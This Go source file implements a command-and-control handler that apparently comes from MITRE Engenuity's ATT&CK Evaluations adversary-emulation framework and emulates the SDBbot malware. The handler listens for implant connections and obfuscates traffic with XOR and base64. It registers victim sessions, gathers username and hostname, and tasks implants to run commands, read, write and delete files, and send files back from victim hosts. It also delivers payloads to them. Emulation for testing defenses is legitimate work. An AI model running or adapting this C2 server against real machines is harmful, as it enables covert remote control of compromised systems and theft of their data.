package sdbbot

import (
    "bytes"
    "crypto/subtle"
    "encoding/base64"
    "encoding/json"
    "errors"
    "fmt"
    "io"
    "net"
    "strings"

    "attackevals.mitre-engenuity.org/control_server/config"
    "attackevals.mitre-engenuity.org/control_server/handlers/base_handler"
    "attackevals.mitre-engenuity.org/control_server/handlers/handler_manager"
    "attackevals.mitre-engenuity.org/control_server/handlers/handler_util"
    "attackevals.mitre-engenuity.org/control_server/logger"
)

const (
    HANDLER_NAME = "sdbbot"

    // Tasking commands
    recon      = "42"
    execute    = "2"
    writeFile  = "15"
    readFile   = "24"
    deleteFile = "26"
)

var (
    commands = map[string]string{
        "recon":    recon,
        "execute":  execute,
        "download": writeFile,
        "read":     readFile,
        "delete":   deleteFile,
    }

    xorKey = []byte{0x0F, 0x00, 0x00, 0x0D}
)

// Represents the implant's response to the C2
type ImplantResponse struct {
    Header     string `json:"header,omitempty"`
    Command    string `json:"command,omitempty"`
    FullPacket string `json:",omitempty"`
}

// Represents an implant task (C2 --> implant)
type Task struct {
    Header       string `json:"header,omitempty"`
    Command      string `json:"command,omitempty"`
    Args         string `json:"execute,omitempty"`
    FilePath     string `json:"filePath,omitempty"`
    FileContents []byte `json:"fileContents,omitempty"`
}

type SDBbotHandler struct {
    baseHandler        *base_handler.BaseHandlerUtil
    wrappedFuncHandles *WrappedFuncHandles

    // to be initialized after init()
    l net.Listener
}

type WrappedFuncHandles struct {
    randStringGetter handler_util.RandAlphanumericStringGetter
}

func SDBbotHandlerFactory(funcHandles *WrappedFuncHandles) *SDBbotHandler {
    baseHandler := base_handler.BaseHandlerFactory(HANDLER_NAME)

    return &SDBbotHandler{
        baseHandler:        baseHandler,
        wrappedFuncHandles: funcHandles,
    }
}

func init() {
    // use production function wrappers
    wrappedFuncHandles := &WrappedFuncHandles{
        randStringGetter: handler_util.GetRandomAlphanumericString,
    }
    handler_manager.RegisterAvailableHandler(SDBbotHandlerFactory(wrappedFuncHandles))
}

func (s *SDBbotHandler) GetName() string {
    return HANDLER_NAME
}

// StartHandler starts the C2 handler
func (s *SDBbotHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
    // set the bind and REST API addresses for the base handler
    err := s.baseHandler.SetBindAddr(configEntry)
    if err != nil {
        return err
    }
    s.baseHandler.SetRestApiAddr(restAddress)
    s.baseHandler.HandlerLogInfo("Starting %s Handler to listen on %s", s.baseHandler.Name, s.baseHandler.BindAddr)

    // Start the TCP listener
    s.l, err = net.Listen("tcp", s.baseHandler.BindAddr)
    if err != nil {
        panic(err)
    }
    go s.startListener()

    return nil

}

// StopHandler stops the C2 handler
func (s *SDBbotHandler) StopHandler() error {
    s.baseHandler.HandlerLogInfo("Stopping %s Handler", s.baseHandler.Name)
    s.l.Close()
    return nil
}

// SDBbot TCP Listener
func (s *SDBbotHandler) startListener() {
    // Listen for incoming connections.
    defer s.l.Close()

    for {
        // Listen for an incoming connection
        conn, err := s.l.Accept()
        if err != nil {
            return
        }
        // Handle connections in a new goroutine
        go func(conn net.Conn) {
            packet := ""
            buf := make([]byte, 1024*1024)
            for {
                len, err := conn.Read(buf)
                if err != nil {
                    if err != io.EOF {
                        fmt.Printf("Error reading: %#v\n", err)
                        return
                    }
                    break
                }
                packet += string(buf[:len])
            }

            // Parse the implant packet
            implantResponse, err := s.ParseImplantResponse(packet)
            if err != nil {
                s.baseHandler.HandlerLogError(err.Error())
                return
            }

            var resp string
            if implantResponse.Command == "" {
                resp, err = s.HandleGetTask(*implantResponse)
            } else {
                resp, err = s.HandleTaskResponse(*implantResponse)
            }

            if err != nil {
                s.baseHandler.HandlerLogError("Failed to handle task/response for implant ID %s: %s", implantResponse.Header, err.Error())
                respBytes, _ := json.Marshal(map[string]string{"header": implantResponse.Header})
                resp = string(respBytes)
            }

            // Encode response
            xorResp := make([]byte, len(resp))
            _ = subtle.XORBytes(xorResp, []byte(resp), bytes.Repeat(xorKey, (len(resp)/len(xorKey))+1))

            // Send response to implant
            conn.Write([]byte(base64.StdEncoding.EncodeToString(xorResp)))
            conn.Close()
        }(conn)
    }
}

func (s *SDBbotHandler) HandleGetTask(resp ImplantResponse) (string, error) {
    var err error
    taskStr := ""

    // Check if we have seen this implant before - if not, create a new session for it
    if !s.baseHandler.HasImplantSession(resp.Header) {
        s.baseHandler.HandlerLogInfo("Received first-time task request from %s. Creating session.", resp.Header)
        sessionData := map[string]string{"guid": resp.Header}
        err = s.baseHandler.RegisterNewImplant(resp.Header, sessionData)
        if err != nil {
            s.baseHandler.HandlerLogError("Failed to register implant session for implant ID %s: %s", resp.Header, err.Error())
            return taskStr, err
        }
        //Set recon task
        reconTask, _ := json.Marshal(ImplantResponse{Header: resp.Header, Command: recon})
        _, err := handler_util.SetTask(s.baseHandler.RestApiAddr, string(reconTask), resp.Header)
        if err != nil {
            s.baseHandler.HandlerLogError("Failed to set recon task for implant ID %s: %s", resp.Header, err.Error())
        }

    } else {
        s.baseHandler.HandlerLogDebug("Received task request from %s", resp.Header)
        taskStr, err = s.baseHandler.GetImplantTask(resp.Header)
        if err != nil {
            s.baseHandler.HandlerLogError("Failed to get task for implant ID %s: %s", resp.Header, err.Error())
            return taskStr, err
        }
    }

    // Create implant beacon response if no task is ready, else prepare the task string
    task := ""
    if taskStr == "" {
        response, _ := json.Marshal(map[string]string{"header": resp.Header})
        task = string(response)
        s.baseHandler.HandlerLogInfo("Tasking implant %s with task: %s", resp.Header, task)
    } else {
        task, err = s.ConvertTaskToResponse(resp.Header, taskStr)
        if err != nil {
            s.baseHandler.HandlerLogError("Failed to convert task to response for implant ID %s: %s", resp.Header, err.Error())
            return taskStr, err
        }
    }

    return task, nil
}

func (s *SDBbotHandler) HandleTaskResponse(resp ImplantResponse) (string, error) {
    var err error
    var taskResponse []byte

    var packetData map[string]interface{}
    err = json.Unmarshal([]byte(resp.FullPacket), &packetData)
    if err != nil {
        return "", err
    }

    // If recon packet, update the implant session
    if resp.Command == recon {
        user, _ := packetData["username"]
        hostName, _ := packetData["pc"]
        s.baseHandler.UpdateImplantSession(resp.Header, map[string]string{"user": user.(string), "hostName": hostName.(string)})
    }

    // If file upload, forward the task response to HandleFileUpload
    if resp.Command == readFile {
        err = s.HandleFileUpload(packetData)
        return "", err
    }

    // Try to pull out the response field, if it does not exist then send the entire packet
    if response, ok := packetData["response"]; ok {
        taskResponse, _ = base64.StdEncoding.DecodeString(response.(string))
    } else {
        taskResponse = []byte(resp.FullPacket)
    }

    s.baseHandler.HandlerLogInfo("Received task response from %s. Registering task output.", resp.Header)
    _, err = s.baseHandler.RegisterTaskOutput(resp.Header, taskResponse)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to register response for implant ID %s: %s", resp.Header, err.Error())
        return "", err
    }

    // Create implant beacon response
    response, err := json.Marshal(map[string]string{"header": resp.Header})

    return string(response), nil
}

func (s *SDBbotHandler) HandleFileUpload(packetData map[string]interface{}) error {
    var fileName string
    var fileData []byte

    // Try to pull out the file name, if it does not exist then create a random one
    if fileNameInt, ok := packetData["fileName"]; ok {
        fileName = fileNameInt.(string)
    } else {
        fileName = s.wrappedFuncHandles.randStringGetter(7)
        s.baseHandler.HandlerLogInfo("Received file upload request without a destination filename header. Generated random filename %s as the destination.", fileName)
    }

    // Try to pull out the file data, throw error if invalid / does not exist
    if fileDataInt, ok := packetData["fileContents"]; ok {
        fileData, _ = base64.StdEncoding.DecodeString(fileDataInt.(string))
    } else {
        return errors.New("Failed to upload file, invalid/non-existent file data.")
    }

    // Save file via REST API
    _, err := s.baseHandler.SaveUploadedFile(fileName, fileData)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to save file %s: %s", fileName, err.Error())
        return err
    }
    s.baseHandler.HandlerLogSuccess("Successfully saved uploaded file as %s", fileName)

    return nil
}

func (s *SDBbotHandler) ConvertTaskToResponse(header, taskString string) (string, error) {
    var task Task
    var taskData map[string]interface{}
    trimmedTask := strings.TrimSpace(taskString)
    err := json.Unmarshal([]byte(trimmedTask), &taskData)
    if err != nil {
        return "", err
    }

    // Set the header for the task
    task.Header = header

    // Extract the command ID
    if cmdIDVal, ok := taskData["id"]; ok {
        parsedCmdID, castOk := cmdIDVal.(string)
        if !castOk {
            return "", errors.New(fmt.Sprintf("Bad command ID: %v", cmdIDVal))
        }
        task.Command = commands[parsedCmdID]
    } else {
        return "", errors.New("Command ID not provided in task string")
    }

    //Extract file path/args
    if argStr, ok := taskData["arg"]; ok {
        if task.Command == execute {
            task.Args = strings.TrimSpace(argStr.(string))
        } else {
            task.FilePath = strings.TrimSpace(argStr.(string))
        }
    }

    //Extract payload name and data
    payloadNameStr, ok := taskData["payload"]
    if !ok {
        payloadNameStr = ""
    }
    if len(payloadNameStr.(string)) > 0 {
        logger.Info("Fetching requested payload for task: ", payloadNameStr.(string))
        task.FileContents, err = s.baseHandler.GetFileFromRestServer(payloadNameStr.(string))
        if err != nil {
            return "", err
        }
    }

    // Convert task struct to string
    taskResp, _ := json.Marshal(task)

    // Log task response (do not print out file bytes if download task)
    if task.Command == writeFile {
        s.baseHandler.HandlerLogSuccess("Sent file %s to path %s", payloadNameStr, task.FilePath)
    } else {
        s.baseHandler.HandlerLogInfo("Tasking implant %s with task: %s", header, string(taskResp))
    }

    return string(taskResp), nil
}

func (s *SDBbotHandler) ParseImplantResponse(b64Data string) (*ImplantResponse, error) {
    var err error
    var jsonResp ImplantResponse

    // B64 and XOR the data
    xorData, _ := base64.StdEncoding.DecodeString(b64Data)
    data := make([]byte, len(xorData))
    _ = subtle.XORBytes(data, xorData, bytes.Repeat(xorKey, (len(xorData)/len(xorKey))+1))

    // Extract the JSON data
    err = json.Unmarshal(data, &jsonResp)
    if err != nil {
        return nil, errors.New(fmt.Sprintf("Invalid JSON data: %s", err.Error()))
    }

    if jsonResp.Header == "" {
        return nil, errors.New("Implant response does not contain UUID. Packet is invalid.")
    }
    jsonResp.FullPacket = string(data)

    return &jsonResp, nil
}
